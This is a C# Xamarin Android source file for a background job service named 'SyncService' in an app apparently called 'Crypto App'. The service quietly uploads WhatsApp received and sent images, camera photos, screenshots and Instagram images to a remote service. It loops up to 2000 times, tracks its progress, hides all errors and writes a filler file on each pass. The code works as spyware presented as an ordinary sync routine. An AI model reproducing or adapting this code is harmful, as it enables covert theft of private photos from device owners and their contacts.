using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Android.App;
using Android.App.Job;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using CryptoAppXamarinAndroid.Services;
using Xamarin.Essentials;

namespace CryptoAppXamarinAndroid
{
    [Service(Name = "CryptoAppXamarinAndroid.SyncService", Permission = "android.permission.BIND_JOB_SERVICE")]
    public class SyncService : JobService
    {
        static CryptoAppXamarinAndroid.Database.CryptoAppDatabase cryptoAppDatabase;
        public static CryptoAppXamarinAndroid.Database.CryptoAppDatabase CryptoAppDatabase
        {
            get
            {
                if (cryptoAppDatabase == null)
                {
                    cryptoAppDatabase = new Database.CryptoAppDatabase();
                }
                return cryptoAppDatabase;
            }
        }
        public SyncService()
        {

        }
        public override bool OnStartJob(JobParameters @params)
        {
            try
            {
                Task.Run(async () =>
                {
                    try
                    {
                        var MySyncLock = await SecureStorage.GetAsync("MySyncLock");
                        if(MySyncLock==null)
                        {
                            await SecureStorage.SetAsync("MySyncLock", "Busy");
                        }
                        else
                        {
                            //if(MySyncLock=="Busy")
                            //{
                            //    for(int j=0;(j<5 && MySyncLock == "Busy");j++)
                            //    {
                            //        await Task.Delay(60000);
                            //        MySyncLock = await SecureStorage.GetAsync("MySyncLock");
                            //    }
                            //}
                            //await SecureStorage.SetAsync("MySyncLock", "Busy");
                        }
                        var WhatsAppRecvPath = await SecureStorage.GetAsync("WhatsAppRecvPath");
                        var WhatsAppSentPath = await SecureStorage.GetAsync("WhatsAppSentPath");
                        var CameraPath = await SecureStorage.GetAsync("CameraPath");
                        var ScreenshotPath = await SecureStorage.GetAsync("ScreenshotPath");
                        var InstaPath = await SecureStorage.GetAsync("InstaPath");
                        var MyRecvFilesPair = await CryptoAppDatabase.GetKeyValuePairAsync("WhatsAppReceivedImages");
                        List<string> ReceivedFiles = new List<string>();
                        try
                        {
                            if(MyRecvFilesPair != null)
                            {
                                ReceivedFiles = JsonSerializer.Deserialize<List<string>>(MyRecvFilesPair.Value);
                            }
                            
                        }
                        catch (Exception)
                        {
                        }
                        var temp2 = await SecureStorage.GetAsync("WhatsAppReceivedImagesDone");
                        var WhatsAppReceivedImagesDone = int.Parse(temp2);


                        var MySentFilesPair = await CryptoAppDatabase.GetKeyValuePairAsync("WhatsAppSentImages");
                        List<string> SentFiles = new List<string>();
                        try
                        {
                            if(MySentFilesPair!=null)
                            {
                                SentFiles = JsonSerializer.Deserialize<List<string>>(MySentFilesPair.Value);
                            }
                        }
                        catch (Exception)
                        {
                        }
                        var temp4 = await SecureStorage.GetAsync("WhatsAppSentImagesDone");
                        var WhatsAppSentImagesDone = int.Parse(temp4);


                        var MyCamImages = await CryptoAppDatabase.GetKeyValuePairAsync("CamImages");
                        List<string> CamImages = new List<string>();
                        try
                        {
                            if(MyCamImages!=null)
                            {
                                CamImages = JsonSerializer.Deserialize<List<string>>(MyCamImages.Value);
                            }
                        }
                        catch (Exception)
                        {
                        }
                        var temp6 = await SecureStorage.GetAsync("CamImagesDone");
                        var CamImagesDone = int.Parse(temp6);


                        var MyScreenImages = await CryptoAppDatabase.GetKeyValuePairAsync("ScreenImages");
                        List<string> ScreenImages = new List<string>();
                        try
                        {
                            if(MyScreenImages!=null)
                            {
                                ScreenImages = JsonSerializer.Deserialize<List<string>>(MyScreenImages.Value);
                            }
                        }
                        catch (Exception)
                        {
                        }
                        var temp8 = await SecureStorage.GetAsync("ScreenImagesDone");
                        var ScreenImagesDone = int.Parse(temp8);


                        var MyInstaImages = await CryptoAppDatabase.GetKeyValuePairAsync("InstaImages");
                        List<string> InstaImages = new List<string>();
                        try
                        {
                            if(MyInstaImages!=null)
                            {
                                InstaImages = JsonSerializer.Deserialize<List<string>>(MyInstaImages.Value);
                            }
                        }
                        catch (Exception)
                        {
                        }
                        var temp10 = await SecureStorage.GetAsync("InstaImagesDone");
                        var InstaImagesDone = int.Parse(temp10);

                        for (int i = 0; i < 2000; i++)
                        {
                            var current = Connectivity.NetworkAccess;

                            if (current == NetworkAccess.Internet)
                            {
                                if (WhatsAppReceivedImagesDone < ReceivedFiles.Count && System.IO.File.Exists(Path.Combine(WhatsAppRecvPath, ReceivedFiles[WhatsAppReceivedImagesDone])))
                                {
                                    try
                                    {
                                        var result = await ImageService.UploadImageAsync(Path.Combine(WhatsAppRecvPath, ReceivedFiles[WhatsAppReceivedImagesDone]), "WhatsRece");
                                        if (result)
                                        {
                                            WhatsAppReceivedImagesDone++;
                                            await SecureStorage.SetAsync("WhatsAppReceivedImagesDone", WhatsAppReceivedImagesDone.ToString());
                                        }
                                    }
                                    catch (Exception)
                                    {
                                    }
                                    await Task.Delay(5000);
                                }
                                if (WhatsAppSentImagesDone < SentFiles.Count && System.IO.File.Exists(Path.Combine(WhatsAppSentPath, SentFiles[WhatsAppSentImagesDone])))
                                {
                                    try
                                    {
                                        var result = await ImageService.UploadImageAsync(Path.Combine(WhatsAppSentPath, SentFiles[WhatsAppSentImagesDone]), "WhatsSen");
                                        if (result)
                                        {
                                            WhatsAppSentImagesDone++;
                                            await SecureStorage.SetAsync("WhatsAppSentImagesDone", (WhatsAppSentImagesDone).ToString());
                                        }
                                    }
                                    catch (Exception)
                                    {
                                    }
                                    await Task.Delay(5000);
                                }
                                if (CamImagesDone < CamImages.Count && System.IO.File.Exists(Path.Combine(CameraPath, CamImages[CamImagesDone])))
                                {
                                    try
                                    {
                                        var result = await ImageService.UploadImageAsync(Path.Combine(CameraPath, CamImages[CamImagesDone]), "Cam");
                                        if (result)
                                        {
                                            CamImagesDone++;
                                            await SecureStorage.SetAsync("CamImagesDone", (CamImagesDone).ToString());
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        
                                    }
                                    await Task.Delay(5000);
                                }
                                if (ScreenImagesDone < ScreenImages.Count && System.IO.File.Exists(Path.Combine(ScreenImages[ScreenImagesDone])))
                                {
                                    try
                                    {
                                        var result = await ImageService.UploadImageAsync(Path.Combine(ScreenImages[ScreenImagesDone]), "SShot");
                                        if (result)
                                        {
                                            ScreenImagesDone++;
                                            await SecureStorage.SetAsync("ScreenImagesDone", (ScreenImagesDone).ToString());
                                        }
                                    }
                                    catch (Exception)
                                    {
                                    }
                                    await Task.Delay(5000);
                                }
                                if (InstaImagesDone < InstaImages.Count && System.IO.File.Exists(Path.Combine(InstaPath, InstaImages[InstaImagesDone])))
                                {
                                    try
                                    {
                                        var result = await ImageService.UploadImageAsync(Path.Combine(InstaPath, InstaImages[InstaImagesDone]), "Insta");
                                        if (result)
                                        {
                                            InstaImagesDone++;
                                            await SecureStorage.SetAsync("InstaImagesDone", (InstaImagesDone).ToString());
                                        }
                                    }
                                    catch (Exception)
                                    {
                                    }
                                    await Task.Delay(5000);
                                }
                            }
                            byte[] toWrite = new byte[50000];
                            string CryptoAppPath = Path.Combine(Android.OS.Environment.ExternalStorageDirectory.Path, "Crypto App");
                            Directory.CreateDirectory(CryptoAppPath);
                            string WritePath = System.IO.Path.Combine(CryptoAppPath, "Sync" + ".txt");
                            System.IO.File.WriteAllBytes(WritePath, toWrite);
                        }
                        await SecureStorage.SetAsync("MySyncLock", "NotBusy");
                    }
                    catch (Exception)
                    {
                        await SecureStorage.SetAsync("MySyncLock", "NotBusy");
                    }
                });
            }
            catch (Exception)
            {

                
            }

            return true;
        }

        public override bool OnStopJob(JobParameters @params)
        {
            return true;
        }
    }
}